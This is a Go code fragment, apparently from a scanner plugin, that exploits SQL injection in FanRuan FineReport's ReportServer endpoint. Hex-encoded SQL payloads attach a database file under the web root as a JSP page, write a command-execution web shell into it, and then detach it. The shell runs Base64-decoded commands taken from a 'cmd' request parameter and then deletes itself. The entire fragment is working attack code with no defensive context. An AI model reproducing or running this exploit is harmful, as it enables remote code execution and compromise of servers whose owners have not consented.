		vulurl := "/webroot/decision/view/ReportServer"
		//生成随机6位数字字符串
		filename := goutils.RandomHexString(7)
		//编码文件名
		filename = "t" + filename
		hex := "0123456789abcdef"
		encoded := ""
		for _, r := range filename {
			bytes := []byte(string(r))
			for _, b := range bytes {
				encoded += "%" + string(hex[b>>4]) + string(hex[b&0x0F])
			}
		}
		paylaod1 := "%ef%bb%bf%61%74%74%61%63%68%0c%64%61%74%61%62%61%73%65%20%27%2e%2e%2f%77%65%62%61%70%70%73%2f%77%65%62%72%6f%6f%74%2f%68%65%6c%70%2f" + encoded + "%2e%6a%73%70%27%20%61%73%20%27" + encoded + "%27%3b"
		paylaod2 := "%ef%bb%bf%63%72%65%61%74%65%0c%74%61%62%6c%65%20" + encoded + "%2e%74%74%28%64%61%74%61%7a%20%74%65%78%74%29%3b"
		payload3 := "%ef%bb%bfinsert+%0cinto+"+encoded+".tt(dataz)+VALUES+(%27%3c%25%40+page+import%3d%22java.util.Base64%22%25%3e%3c%25+out.print(%22--start--%22)%3bString+c%3drequest.getParameter(%22cmd%22)%3bString+d%3dnew+String(Base64.getDecoder().decode(c))%3bjava.io.InputStream+in+%3d+Runtime.getRuntime().exec(d).getInputStream()%3b+int+a+%3d+-1%3b+byte%5b%5d+b+%3d+new+byte%5b2048%5d%3bwhile((a%3din.read(b))!%3d-1)%7b+out.println(new+String(b))%3b%7djava.io.File+g%3dnew+java.io.File(application.getRealPath(request.getServletPath()))%3bout.print(%22--end--%22)%3bg.delete()%3b%25%3e%27)%3b"
    payload4 := "%44%45%54%41%43%48%20%44%41%54%41%42%41%53%45%20%27"+encoded+"%27%3b"
		data := `/webroot/decision/view/ReportServer?&n=${__fr_locale__=sql('FRDemo',DECODE('` + paylaod1 + `'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('` + paylaod2 + `'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('` + payload3 + `'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('`+payload4+`'),1,1)}`
